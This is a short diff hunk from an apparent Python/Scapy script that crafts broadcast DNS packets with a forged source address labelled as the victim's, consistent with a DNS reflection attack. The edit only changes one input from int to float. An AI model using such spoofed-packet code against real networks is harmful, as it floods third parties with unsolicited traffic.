@@ -54,7 +54,7 @@ def main():
 
     N = int(raw_input())
     for i in range(0, N):
-        a = int(raw_input())
+        a = float(raw_input())
         b = int(raw_input())
         pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
         pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[b].getlayer(DNS)
